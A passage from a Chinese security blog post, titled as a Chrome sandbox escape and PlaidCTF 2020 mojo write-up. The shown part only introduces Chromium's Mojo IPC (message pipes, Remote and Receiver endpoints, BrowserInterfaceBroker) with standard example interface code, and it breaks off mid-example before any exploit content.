<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="cpp," />




  


  <link rel="alternate" href="/atom.xml" title="Sakuraのblog" type="application/atom+xml" />






<meta name="description" content="chrome sandbox escape case study and plaidctf2020 mojo writeupmojoIntro to Mojo &amp; Servicesmojo术语message pipe是一对endpoints，对应通信的两端，每个endpoint保存一个传入消息队列，并且在一端写入消息可以有效地传送到另一端，因此message pipe是双向的。一个mojo">
<meta property="og:type" content="article">
<meta property="og:title" content="chrome sandbox escape case study and plaidctf2020 mojo writeup">
<meta property="og:url" content="http://eternalsakura13.com/2020/09/20/mojo/index.html">
<meta property="og:site_name" content="Sakuraのblog">
<meta property="og:description" content="chrome sandbox escape case study and plaidctf2020 mojo writeupmojoIntro to Mojo &amp; Servicesmojo术语message pipe是一对endpoints，对应通信的两端，每个endpoint保存一个传入消息队列，并且在一端写入消息可以有效地传送到另一端，因此message pipe是双向的。一个mojo">
<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-06-074647.jpg">
<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-06-080009.jpg">
<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-06-083538.jpg">
<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-17-073550.png">
<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-17-120341.jpg">
<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-17-120828.png">
<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-22-150830.png">
<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-22-160738.jpg">
<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-22-160738.jpg">
<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-22-171201.png">
<meta property="article:published_time" content="2020-09-20T15:18:59.687Z">
<meta property="article:modified_time" content="2021-05-08T07:55:05.932Z">
<meta property="article:author" content="sakura">
<meta property="article:tag" content="cpp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-06-074647.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: 'QOPH9ID41Z',
      apiKey: '',
      indexName: 'sakura',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://eternalsakura13.com/2020/09/20/mojo/"/>





  <title>chrome sandbox escape case study and plaidctf2020 mojo writeup | Sakuraのblog</title>
  




<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-113420358-1', 'auto');
  ga('send', 'pageview');
</script>





<meta name="generator" content="Hexo 4.2.1"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Sakuraのblog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-buglist">
          <a href="/buglist/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            BugList
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2020/09/20/mojo/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sakura">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/sakura_heart.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sakuraのblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">chrome sandbox escape case study and plaidctf2020 mojo writeup</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-09-20T23:18:59+08:00">
                2020-09-20
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/" itemprop="url" rel="index">
                    <span itemprop="name">浏览器</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2020/09/20/mojo/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2020/09/20/mojo/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2020/09/20/mojo/" class="leancloud_visitors" data-flag-title="chrome sandbox escape case study and plaidctf2020 mojo writeup">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="chrome-sandbox-escape-case-study-and-plaidctf2020-mojo-writeup"><a href="#chrome-sandbox-escape-case-study-and-plaidctf2020-mojo-writeup" class="headerlink" title="chrome sandbox escape case study and plaidctf2020 mojo writeup"></a>chrome sandbox escape case study and plaidctf2020 mojo writeup</h1><h2 id="mojo"><a href="#mojo" class="headerlink" title="mojo"></a>mojo</h2><h3 id="Intro-to-Mojo-amp-Services"><a href="#Intro-to-Mojo-amp-Services" class="headerlink" title="Intro to Mojo &amp; Services"></a>Intro to Mojo &amp; Services</h3><h4 id="mojo术语"><a href="#mojo术语" class="headerlink" title="mojo术语"></a>mojo术语</h4><p>message pipe是一对endpoints，对应通信的两端，每个endpoint保存一个传入消息队列，并且在一端写入消息可以有效地传送到另一端，因此message pipe是双向的。<br>一个mojom文件描述一组interfaces，其代表的是强类型的消息集合。<br>给定一个mojom接口和一条message pipe，可以将其中一端指定为Remote，用来发送该接口描述的消息，另一端指定为Recevier，用来接收接口的消息。<br>注意:上面的概括有点过于简化。请记住，消息管道仍然是双向的，mojom message有可能期望得到response，response是从Receiver端点发送的，并由Remote接收。<br>Receiver端必须和mojom接口的具体实现(implementation)相绑定，从而将收到的消息分发给对应的接口实现函数。</p>
<h4 id="定义一个新的Frame-Interface"><a href="#定义一个新的Frame-Interface" class="headerlink" title="定义一个新的Frame Interface"></a>定义一个新的Frame Interface</h4><p>假设我们想从render frame向其对应在browser进程里的RenderFrameHostImpl发送一个“Ping”消息，我们需要去定义一个mojom interface，创建一个pipe去使用这个interface，然后绑定好pipe的两端以发送和接收消息。</p>
<h5 id="定义一个interface"><a href="#定义一个interface" class="headerlink" title="定义一个interface"></a>定义一个interface</h5><p>第一步是去创建一个.mojom文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; src&#x2F;example&#x2F;public&#x2F;mojom&#x2F;ping_responder.mojom</span><br><span class="line">module example.mojom;</span><br><span class="line"></span><br><span class="line">interface PingResponder &#123;</span><br><span class="line">  &#x2F;&#x2F; Receives a &quot;Ping&quot; and responds with a random integer.</span><br><span class="line">  Ping() &#x3D;&gt; (int32 random);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>对应创建一个build rule去生成c++ bindings</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># src&#x2F;example&#x2F;public&#x2F;mojom&#x2F;BUILD.gn</span><br><span class="line">import(&quot;&#x2F;&#x2F;mojo&#x2F;public&#x2F;tools&#x2F;bindings&#x2F;mojom.gni&quot;)</span><br><span class="line">mojom(&quot;mojom&quot;) &#123;</span><br><span class="line">  sources &#x3D; [ &quot;ping_responder.mojom&quot; ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="创建pipe"><a href="#创建pipe" class="headerlink" title="创建pipe"></a>创建pipe</h5><p>现在，让我们创建一个消息管道以使用此接口。通常，为了方便起见，在使用Mojo时，接口的client（即remote）通常是创建新pipe的一方。这很方便，因为可以使用Remote来立即发送消息，而无需等待InterfaceRequest端点被绑定到任何地方。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/third_party/blink/example/public/ping_responder.h</span></span><br><span class="line">mojo::Remote&lt;example::mojom::PingResponder&gt; ping_responder;</span><br><span class="line">mojo::PendingReceiver&lt;example::mojom::PingResponder&gt; receiver =</span><br><span class="line">    ping_responder.BindNewPipeAndPassReceiver();</span><br></pre></td></tr></table></figure>
<p>在此示例中，ping_responder是Remote，并且receiver是PendingReceiver，这是Receiver的前身。BindNewPipeAndPassReceiver是创建消息管道的最常见方法:它产生PendingReceiver作为返回值。<br>注意：一个PendingReceiver实际上不执行任何操作。它是单个消息管道端点的惰性持有者。它的存在只是为了使其端点在编译时具有更强的类型，这表明该端点希望被绑定到具体的接口类型。</p>
<h5 id="发送message"><a href="#发送message" class="headerlink" title="发送message"></a>发送message</h5><p>最后，我们可以通过Remote调用我们的Ping()方法来发送消息：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/third_party/blink/example/public/ping_responder.h</span></span><br><span class="line">ping_responder-&gt;Ping(base::BindOnce(&amp;OnPong));</span><br></pre></td></tr></table></figure>
<p>重要说明：如果我们想接收response，则必须保持ping_responder对象处于活动状态直到OnPong被调用。毕竟，ping_responder拥有消息管道端点。如果它被销毁了，那么端点也将被销毁，将没有任何东西可以接收到响应消息。<br>我们快完成了！当然，如果一切都这么简单，那么该文档就不需要存在。我们已经解决了将消息从render进程发送到browser进程的难题，并将其转化为一个问题:<br>我们只要把上面的receiver object传递给browser进程，就可以让receiver来分发它收到的消息到具体的实现函数里。</p>
<h5 id="发送PendingReceiver给Browser"><a href="#发送PendingReceiver给Browser" class="headerlink" title="发送PendingReceiver给Browser"></a>发送PendingReceiver给Browser</h5><p>值得注意的是，PendingReceivers（通常是消息管道端点）也是可以通过mojom消息自由发送的一种对象，将PendingReceiver放置在某处的最常见方法是将其作为方法参数传递给其他已经连接的接口。<br>将render里的RenderFrameImpl和其对应的RenderFrameHostImpl连接的interface是BrowserInterfaceBroker<br>这个interface是用来获取其他interface的factory，它的GetInterface方法接收一个GenericPendingReceiver（GenericPendingReceiver允许传递任意的interface receiver）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">interface BrowserInterfaceBroker &#123;</span><br><span class="line">  GetInterface(mojo_base.mojom.GenericPendingReceiver receiver);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于GenericPendingReceiver可以从任何PendingReceiver隐式构造，所以可以使用之前通过BindNewPipeAndPassReceiver创建的receiver来调用此方法：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RenderFrame* my_frame = GetMyFrame();</span><br><span class="line">my_frame-&gt;GetBrowserInterfaceBroker().GetInterface(<span class="built_in">std</span>::<span class="built_in">move</span>(receiver));</span><br></pre></td></tr></table></figure>
<p>这将传送PendingReceiver到browser进程里，并被BrowserInterfaceBroker接口的具体实现接收和处理。</p>
<h5 id="实现interface"><a href="#实现interface" class="headerlink" title="实现interface"></a>实现interface</h5><p>我们需要一个browser-side的PingResponder实现</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"example/public/mojom/ping_responder.mojom.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PingResponderImpl</span> :</span> example::mojom::PingResponder &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// impl里保存receiver_</span></span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">PingResponderImpl</span><span class="params">(mojo::PendingReceiver&lt;example::mojom::PingResponder&gt; receiver)</span></span></span><br><span class="line"><span class="function">      : <span class="title">receiver_</span><span class="params">(<span class="keyword">this</span>, <span class="built_in">std</span>::<span class="built_in">move</span>(receiver))</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// example::mojom::PingResponder:</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Ping</span><span class="params">(PingCallback callback)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Respond with a random 4, chosen by fair dice roll.</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">move</span>(callback).Run(<span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  mojo::Receiver&lt;example::mojom::PingResponder&gt; receiver_;</span><br><span class="line"></span><br><span class="line">  DISALLOW_COPY_AND_ASSIGN(PingResponderImpl);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>RenderFrameHostImpl保存一个BrowserInterfaceBroker的实现，当此实现收到GetInterface方法调用时，它将调用先前为此特定接口注册的处理程序。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// render_frame_host_impl.h</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RenderFrameHostImpl</span></span></span><br><span class="line"><span class="class">  ...</span></span><br><span class="line"><span class="class">  <span class="title">void</span> <span class="title">GetPingResponder</span>(<span class="title">mojo</span>:</span>:PendingReceiver&lt;example::mojom::PingResponder&gt; receiver);</span><br><span class="line">  ...</span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;PingResponderImpl&gt; ping_responder_;</span><br><span class="line">  ...</span><br><span class="line">    <span class="comment">// BrowserInterfaceBroker implementation through which this</span></span><br><span class="line">  <span class="comment">// RenderFrameHostImpl exposes document-scoped Mojo services to the currently</span></span><br><span class="line">  <span class="comment">// active document in the corresponding RenderFrame.</span></span><br><span class="line">  BrowserInterfaceBrokerImpl&lt;RenderFrameHostImpl, RenderFrameHost*&gt; broker_&#123;</span><br><span class="line">      <span class="keyword">this</span>&#125;;</span><br><span class="line">  mojo::Receiver&lt;<span class="built_in">blink</span>::mojom::BrowserInterfaceBroker&gt; broker_receiver_&#123;</span><br><span class="line">      &amp;broker_&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// render_frame_host_impl.cc</span></span><br><span class="line"><span class="comment">// 可以看到GetPingResponder使用receiver构造出了一个PingResponderImpl对象</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RenderFrameHostImpl::GetPingResponder</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    mojo::PendingReceiver&lt;example::mojom::PingResponder&gt; receiver)</span> </span>&#123;</span><br><span class="line">  ping_responder_ = <span class="built_in">std</span>::make_unique&lt;PingResponderImpl&gt;(<span class="built_in">std</span>::<span class="built_in">move</span>(receiver));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// browser_interface_binders.cc</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PopulateFrameBinders</span><span class="params">(RenderFrameHostImpl* host,</span></span></span><br><span class="line"><span class="function"><span class="params">                          mojo::BinderMap* <span class="built_in">map</span>)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">  <span class="comment">// Register the handler for PingResponder.</span></span><br><span class="line">  <span class="built_in">map</span>-&gt;Add&lt;example::mojom::PingResponder&gt;(base::BindRepeating(</span><br><span class="line">    &amp;RenderFrameHostImpl::GetPingResponder, base::Unretained(host)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们完成了,此设置足以在renderer frame与其browser-side host之间建立新的接口连接！<br>假设我们在render中将ping_responder对象保持足够长的生命，我们最终将看到其OnPong回调将以参数4调用，如上面的browser端实现所定义。</p>
<h3 id="Mojo-Basics"><a href="#Mojo-Basics" class="headerlink" title="Mojo Basics"></a>Mojo Basics</h3><h4 id="Interfaces"><a href="#Interfaces" class="headerlink" title="Interfaces"></a>Interfaces</h4><p>同上，我们再看一组interface和它的impl<br><strong>Mojo通过callback来返回result，即正常我们看到的是return一个返回值return_value，而mojo则是在最后调用callback(return_value)来返回result</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> math.mojom;</span><br><span class="line"></span><br><span class="line">interface Math &#123;</span><br><span class="line">  <span class="comment">// Adds two int32s and returns the result as an int64 (to avoid</span></span><br><span class="line">  <span class="comment">// overflow issues).</span></span><br><span class="line">  Add(int32 x, int32 y) =&gt; (int64 sum);</span><br><span class="line">&#125;;</span><br><span class="line">...</span><br><span class="line">mojom(<span class="string">"mojom"</span>) &#123;</span><br><span class="line">  sources = [<span class="string">"math.mojom"</span>]</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">class MathImpl : <span class="keyword">public</span> math::mojom::Math &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">explicit</span> MathImpl(mojo::PendingReceiver&lt;math::mojom::Math&gt; receiver)</span><br><span class="line">      : receiver_(<span class="keyword">this</span>, <span class="built_in">std</span>::<span class="built_in">move</span>(receiver)) &#123;&#125;</span><br><span class="line">  <span class="comment">// math::mojom::Math overrides:</span></span><br><span class="line">  <span class="comment">// Note: AddCallback is a type alias for base::OnceCallback&lt;void(int64_t)&gt;.</span></span><br><span class="line">  <span class="comment">// The parameters to the callback are the reply parameters specified in the</span></span><br><span class="line">  <span class="comment">// Mojo IDL method definition. This is part of the boilerplate generated by</span></span><br><span class="line">  <span class="comment">// Mojo: invoking |reply| will send a reply to the caller.</span></span><br><span class="line">  <span class="keyword">void</span> Add(<span class="keyword">int32_t</span> x, <span class="keyword">int32_t</span> y, AddCallback reply) <span class="keyword">override</span> &#123;</span><br><span class="line">    <span class="comment">// Note: Mojo always returns results via callback. While it is possible to</span></span><br><span class="line">    <span class="comment">// make a sync IPC which blocks on the reply, the handler will always return</span></span><br><span class="line">    <span class="comment">// the result via callback.</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">move</span>(reply).Run(<span class="keyword">static_cast</span>&lt;<span class="keyword">int64_t</span>&gt;(x) + y);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="comment">// Wraps a message pipe endpoint that receives incoming messages. See the</span></span><br><span class="line">  <span class="comment">// message pipes section below for more information.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// wrap消息管道的receiver端</span></span><br><span class="line">  mojo::Receiver&lt;math::mojom::Math&gt; receiver_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="Message-Pipes"><a href="#Message-Pipes" class="headerlink" title="Message Pipes"></a>Message Pipes</h4><p>message pipe的两端已经在上面说过了，不再赘述</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Wraps a message pipe endpoint for making remote calls. May only be used on</span></span><br><span class="line"><span class="comment">// the sequence where the mojo::Remote was bound.</span></span><br><span class="line">mojo::Remote&lt;math::mojom::Math&gt; remote_math = ...;</span><br><span class="line">...</span><br><span class="line"><span class="comment">// 通常是保存在mojo impl里的一个类成员，wrap message pipe的receiver端，其分发ipc消息到具体的handler（典型的来说，就是发给this,也就是impl)，</span></span><br><span class="line"><span class="comment">// Usually a class member. Wraps a message pipe endpoint that receives incoming</span></span><br><span class="line"><span class="comment">// messages. Routes and dispatches IPCs to the handler—typically |this|—on the</span></span><br><span class="line"><span class="comment">// sequence where the mojo::Receiver was bound.</span></span><br><span class="line">mojo::Receiver&lt;math::mojom::Math&gt; receiver_;</span><br></pre></td></tr></table></figure>
<p>总之，作为结论，对于某一个interface，sender A可以向receiver B进行任意数量的call，而B则可以针对A的每一次call发送一个response给A处理，这就体现出了一种有限的双向通信。<br>Message Pipes可以使用下述方法创建</p>
<h5 id="mojo-Remote-BindNewPipeAndPassReceiver"><a href="#mojo-Remote-BindNewPipeAndPassReceiver" class="headerlink" title="mojo::Remote::BindNewPipeAndPassReceiver"></a>mojo::Remote::BindNewPipeAndPassReceiver</h5><p>当sender/caller创建endpoint时使用。保留一个endpoint以发送IPC消息，另一端点作为未绑定的<code>mojo::PendingReceiver&lt;T&gt;</code>返回，以便receiver/callee绑定到<code>mojo::Receiver&lt;T&gt;</code></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mojo::Remote&lt;math::mojom::Math&gt; remote_math;</span><br><span class="line"></span><br><span class="line"><span class="comment">// BindNewPipeAndPassReceiver返回一个mojo::PendingReceiver&lt;math::mojom::Math&gt;.</span></span><br><span class="line"><span class="comment">// 这可以被bound到一个mojo::Receiver&lt;math::mojom::Math&gt;去处理来自remote_math的调用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// BindNewPipeAndPassReceiver() returns a</span></span><br><span class="line"><span class="comment">// mojo::PendingReceiver&lt;math::mojom::Math&gt;. This may be bound to a</span></span><br><span class="line"><span class="comment">// mojo::Receiver&lt;math::mojom::Math&gt; to handle calls received from</span></span><br><span class="line"><span class="comment">// |remote_math|.</span></span><br><span class="line">LaunchAndBindRemoteMath(remote_math.BindNewPipeAndPassReceiver());</span><br><span class="line"></span><br><span class="line"><span class="comment">// remote_math可以立刻被使用，Add call消息将在receiving端排队，直到其被bound到一个mojo::Receiver&lt;math::mojom::Math&gt;.</span></span><br><span class="line"><span class="comment">// 例如，被mojom的impl使用其构造receive_字段以隐式绑定或者显式的通过::Bind来绑定。</span></span><br><span class="line"><span class="comment">// |remote_math| may be immediately used. The Add() call will be buffered by the</span></span><br><span class="line"><span class="comment">// receiving end and dispatched when mojo::PendingReceiver&lt;math::mojom::Math&gt; is</span></span><br><span class="line"><span class="comment">// bound to a mojo::Receiver&lt;math::mojom::Math&gt;.</span></span><br><span class="line">remote_math-&gt;Add(<span 